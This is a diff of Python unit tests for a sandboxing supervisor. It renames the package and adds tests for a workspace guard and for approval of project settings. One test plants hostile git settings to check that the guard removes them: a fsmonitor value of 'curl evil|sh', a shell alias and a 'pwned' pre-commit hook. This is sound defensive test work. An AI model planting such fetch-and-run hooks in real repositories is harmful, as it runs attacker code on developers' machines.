@@ -1,11 +1,11 @@
 """Unit tests: grants, git/ssh validation, signing payload checks, list-roles parsing."""
 import os, sys, tempfile, time, unittest
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
-os.environ.setdefault("NONO_PI_STATE", tempfile.mkdtemp())
-os.environ.setdefault("NONO_PI_CONFIG", tempfile.mkdtemp())
-os.environ["NONO_PI_KEYSTORE"] = "memory"
-from nonopi import awsdisc, grants as G  # noqa
-from nonopi.supervisor import Supervisor  # noqa
+os.environ.setdefault("GONDO_PI_STATE", tempfile.mkdtemp())
+os.environ.setdefault("GONDO_PI_CONFIG", tempfile.mkdtemp())
+os.environ["GONDO_PI_KEYSTORE"] = "memory"
+from gondopi import awsdisc, grants as G  # noqa
+from gondopi.supervisor import Supervisor  # noqa
 
 
 class Grants(unittest.TestCase):
@@ -27,7 +27,7 @@ class Grants(unittest.TestCase):
 
 class GitBroker(unittest.TestCase):
     def setUp(self):
-        os.environ["NONO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "window"}}'
+        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "window"}}'
         self.s = Supervisor("u-" + str(time.time()), "/tmp", "proj")
 
     def test_fetch_auto_push_asks(self):
@@ -36,7 +36,7 @@ class GitBroker(unittest.TestCase):
         self.assertEqual(self.s.grants.check("git-push", "github.com/newsuk/donk"), "allow")
 
     def test_push_denied(self):
-        os.environ["NONO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "deny"}}'
+        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"git-push": {"choice": "deny"}}'
         ok, msg = self.s.check_git("git@github.com", "22", "git-receive-pack 'o/r.git'")
         self.assertFalse(ok)
 
@@ -67,7 +67,7 @@ class Policy(unittest.TestCase):
     """The VM policy spec: placeholders only, per-session random, each route bound to its host."""
 
     def test_routes_and_aws(self):
-        from nonopi import paths, policy
+        from gondopi import paths, policy
         cfg = paths.load_config()
         cfg["aws"] = {"enabled": True, "accounts": {"a": {"role_arn": "arn:aws:iam::1:role/x"},
                                                     "b": {"role_arn": "arn:aws:iam::2:role/x", "region": "us-east-1"}}}
@@ -76,7 +76,7 @@ class Policy(unittest.TestCase):
         self.assertEqual(gh["host"], "api.github.com")
         self.assertIn("/copilot_internal", gh["excludePaths"])
         self.assertEqual(env["GH_TOKEN"], gh["placeholder"])
-        self.assertTrue(env["GH_TOKEN"].startswith("nonopi_github_"))
+        self.assertTrue(env["GH_TOKEN"].startswith("gondopi_github_"))
         self.assertEqual(sorted(spec["aws"]["profiles"].values()), ["a", "b"])
         self.assertNotIn("AWS_PROFILE", env, "[default] follows the current account instead")
         guest = open(os.path.join(paths.SANDBOX_DIR, "aws-config")).read()
@@ -104,8 +104,8 @@ class AwsUse(unittest.TestCase):
     """aws-use: from the VM it needs the panel's OK; from the host it is your own action."""
 
     def _sup(self, answer):
-        from nonopi import grants as G2
-        os.environ["NONO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "%s"}}' % answer
+        from gondopi import grants as G2
+        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "%s"}}' % answer
         s = Supervisor("u-%s" % time.time(), "/tmp", "u")
         s.cfg["aws"] = {"enabled": True, "accounts": {"a": {"role_arn": "arn:aws:iam::1:role/r"},
                                                       "b": {"role_arn": "arn:aws:iam::2:role/r"}},
@@ -122,7 +122,7 @@ class AwsUse(unittest.TestCase):
         s = self._sup("window")
         self.assertTrue(s.aws_use("a", via="vm")["ok"])
         self.assertEqual(s.aws_current, "a")
-        os.environ["NONO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "deny"}}'
+        os.environ["GONDO_PI_PROMPT_AUTO"] = '{"aws-use": {"choice": "deny"}}'
         self.assertTrue(s.aws_use("a", via="vm")["ok"], "already current: no prompt")
 
     def test_host_switch_and_listing(self):
@@ -133,13 +133,74 @@ class AwsUse(unittest.TestCase):
         self.assertTrue(listing["b"]["current"] and listing["b"]["prod"])
         self.assertFalse(s.aws_use("zzz", via="host")["ok"])
         self.assertNotIn("AccessKeyId", repr(s.aws_accounts()), "listings never carry credentials")
-        os.environ.pop("NONO_PI_PROMPT_AUTO", None)
+        os.environ.pop("GONDO_PI_PROMPT_AUTO", None)
+
+
+class WorkspaceGuard(unittest.TestCase):
+    """Host-exec files planted in the project from the VM are reverted / quarantined / reported."""
+
+    def test_guard(self):
+        import subprocess
+        from gondopi.wsguard import WorkspaceGuard as WG
+        d = tempfile.mkdtemp()
+        subprocess.run(["git", "init", "-q", d], check=True)
+        subprocess.run(["git", "-C", d, "config", "core.editor", "vim"], check=True)   # pre-existing: kept
+        class A:
+            def __init__(self): self.ev = []
+            def log(self, e, **kw): self.ev.append(e)
+        a = A()
+        g = WG(d, a)
+        cfg = os.path.join(d, ".git", "config")
+        subprocess.run(["git", "config", "--file", cfg, "core.fsmonitor", "curl evil|sh"], check=True)
+        subprocess.run(["git", "config", "--file", cfg, "alias.st", "!sh -c evil"], check=True)
+        subprocess.run(["git", "config", "--file", cfg, "user.name", "fine"], check=True)       # harmless: kept
+        hook = os.path.join(d, ".git", "hooks", "pre-commit")
+        open(hook, "w").write("#!/bin/sh\necho pwned\n"); os.chmod(hook, 0o755)
+        open(os.path.join(d, ".envrc"), "w").write("export X=1\n")
+        g.check()
+        got = subprocess.run(["git", "config", "--file", cfg, "--list"], capture_output=True, text=True).stdout
+        self.assertNotIn("fsmonitor", got)
+        self.assertNotIn("alias.st", got)
+        self.assertIn("user.name=fine", got)
+        self.assertIn("core.editor=vim", got)
+        self.assertFalse(os.path.exists(hook))
+        self.assertTrue(os.listdir(os.path.join(d, ".git", "gondo-pi-quarantine")))
+        self.assertIn("workspace-git-config-reverted", a.ev)
+        self.assertIn("workspace-git-hook-quarantined", a.ev)
+        self.assertIn("workspace-trigger-file-changed", a.ev)
+        n = len(a.ev); g.check(); self.assertEqual(len(a.ev), n, "steady state: no repeat events")
+
+
+class ProjectSettings(unittest.TestCase):
+    """The repo's .gondo-pi.json is writable from the VM: only applied once you approve it."""
+
+    def test_repo_file_needs_approval(self):
+        import json
+        from gondopi import projcfg, paths
+        d = tempfile.mkdtemp()
+        f = os.path.join(d, ".gondo-pi.json")
+        json.dump({"allow": ["api.example.com", "bad host"], "aws": "acct", "ports": [3000, 80], "vm": {"cpus": 4},
+                   "services": {"x": "creds can't come from the repo"}}, open(f, "w"))
+        got, note = projcfg.load("p1", d, ask=None)
+        self.assertEqual(got, {}, "not applied without approval")
+        self.assertIn("approve", note)
+        got, _ = projcfg.load("p1", d, ask=lambda t, b: True)
+        self.assertEqual(got, {"allow": ["api.example.com"], "aws": "acct", "ports": [3000], "vm": {"cpus": 4}})
+        got, note = projcfg.load("p1", d, ask=None)
+        self.assertEqual(got["aws"], "acct", "approved content sticks")
+        json.dump({"allow": ["evil.example.com"]}, open(f, "w"))
+        got, note = projcfg.load("p1", d, ask=None)
+        self.assertNotIn("evil.example.com", got.get("allow", []), "a change needs approval again")
+        os.makedirs(os.path.dirname(projcfg.host_file("p1")), exist_ok=True)
+        json.dump({"aws": "mine"}, open(projcfg.host_file("p1"), "w"))
+        got, _ = projcfg.load("p1", d, ask=lambda t, b: True)
+        self.assertEqual(got["aws"], "mine", "your host file wins")
 
 
 class ConfigMerge(unittest.TestCase):
     def test_user_allow_adds_to_defaults(self):
         import json
-        from nonopi import paths
+        from gondopi import paths
         d = tempfile.mkdtemp()
         old = paths.CONFIG_DIR
         paths.CONFIG_DIR = d
